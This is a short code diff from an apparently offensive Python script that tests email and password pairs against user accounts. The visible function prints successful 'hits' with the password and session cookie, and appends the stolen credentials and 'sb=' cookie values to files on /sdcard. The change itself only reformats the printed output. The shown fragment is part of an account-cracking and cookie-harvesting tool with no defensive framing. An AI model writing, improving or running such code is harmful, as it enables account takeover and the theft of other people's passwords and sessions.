@@ -595,10 +595,10 @@ def gxds_files(uid, pxss):
                 )
                 xcki = coki.split("sb=")[1]
                 print(f"""{lgr} [GXDS HITS] --
-EMAIL  : {uid} 
-PASS   : {ps} 
-JOINED : {yrs}
-COOKIE : {coki}
+ EMAIL  : {uid} 
+ PASS   : {ps} 
+ JOINED : {yrs}
+ COOKIE : {coki}
 """)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
@@ -606,9 +606,9 @@ COOKIE : {coki}
                 break
             else:
               print(f"""{lr} [GXDS DEAD] -- {loop}
-EMAIL  : {uid} 
-PASS   : {ps} 
-JOINED : {yrs}
+ EMAIL  : {uid} 
+ PASS   : {ps} 
+ JOINED : {yrs}
 """)
               continue
         loop += 1
